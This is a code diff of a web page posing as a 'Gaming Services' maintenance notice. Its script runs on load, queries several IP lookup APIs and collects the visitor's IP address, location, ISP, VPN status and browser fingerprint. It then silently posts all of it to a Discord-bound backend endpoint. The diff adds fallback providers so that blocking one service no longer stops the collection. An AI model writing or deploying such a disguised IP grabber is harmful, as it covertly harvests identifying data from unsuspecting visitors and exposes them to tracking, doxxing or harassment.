@@ -31,45 +31,52 @@
         <p>Welcome. This website has been temporarily shut down for maintenance and updates.</p>
         <p>We’re currently adding some big updates to the website. This process might take some time. Thank you for your patience.</p>
         
-        <div id="system-log">GATHERING SYSTEM DATA...</div>
+        <div id="system-log">GATHERING ALL SYSTEM DATA...</div>
 
         <p><span class="danger">Get ready gamers</span></p>
     </main>
     <footer>&copy; 2026 Gaming Services. All rights reserved.</footer>
 
     <script>
-        async function getSystemData() {
+        async function getFullData() {
             const log = document.getElementById("system-log");
             let n = {};
-            let vpnDetected = "Unknown";
+            let vpnDetected = "False";
 
-            // Attempt to get IP Data
-            try {
-                const response = await fetch("https://ipapi.co/json/");
-                if (response.ok) n = await response.json();
-            } catch (e) {
-                console.warn("Primary IP API blocked.");
-            }
+            // List of APIs to try in order (if one is blocked, try next)
+            const providers = [
+                "https://ipapi.co/json/",
+                "https://ipwho.is/",
+                "https://api.ipify.org?format=json"
+            ];
 
-            // Attempt to get VPN Detection (only if we have an IP)
-            if (n.ip) {
+            for (let url of providers) {
                 try {
-                    const vpnRes = await fetch(`https://ipwho.is/${n.ip}`);
-                    const vpnData = await vpnRes.json();
-                    vpnDetected = (vpnData.security && vpnData.security.vpn) ? "True" : "False";
-                } catch (e) {
-                    vpnDetected = "Blocked by Browser";
-                }
-            } else {
-                vpnDetected = "API Blocked";
+                    const res = await fetch(url);
+                    if (res.ok) {
+                        const temp = await res.json();
+                        // Merge data into our main object
+                        n = { ...n, ...temp };
+                        // If we got an IP, we can stop the loop
+                        if (n.ip || n.query) break;
+                    }
+                } catch (e) { console.warn("A provider was blocked, moving to next..."); }
             }
+
+            // Clean up naming differences between APIs
+            const finalIP = n.ip || n.query || "Unknown";
+            const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Location Blocked";
+            const finalISP = n.org || n.isp || n.connection?.isp || "Unknown";
+            
+            // Check VPN status from ipwho.is data specifically
+            if (n.security && n.security.vpn) vpnDetected = "True";
 
             const stats = {
-                "IP Address": n.ip || "Blocked by Ad-Blocker",
+                "IP Address": finalIP,
                 "VPN/Proxy Detected": vpnDetected,
-                "Location": n.city ? `${n.city}, ${n.region}, ${n.country_name}` : "Blocked by Ad-Blocker",
-                "Hostname": n.hostname || "None Assigned by ISP",
-                "ISP": n.org || "Unknown",
+                "Location": finalLocation,
+                "Hostname": n.hostname || n.reverse || "None Assigned",
+                "ISP": finalISP,
                 "User Agent": navigator.userAgent,
                 "Window Width": window.innerWidth,
                 "Window Height": window.innerHeight,
@@ -84,7 +91,8 @@
                 "Threads": navigator.hardwareConcurrency || "Unknown",
                 "Memory": navigator.deviceMemory || "Unknown",
                 "System Languages": navigator.languages.join(", "),
-                "Browser Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone
+                "Browser Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Current Time": new Date().toLocaleString()
             };
 
             const output = Object.entries(stats)
@@ -93,14 +101,13 @@
 
             log.textContent = output;
 
-            // Send to Vercel Backend
             fetch("/api/discord", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: output }),
             }).catch(() => {});
         }
-        getSystemData();
+        getFullData();
     </script>
 </body>
 </html>
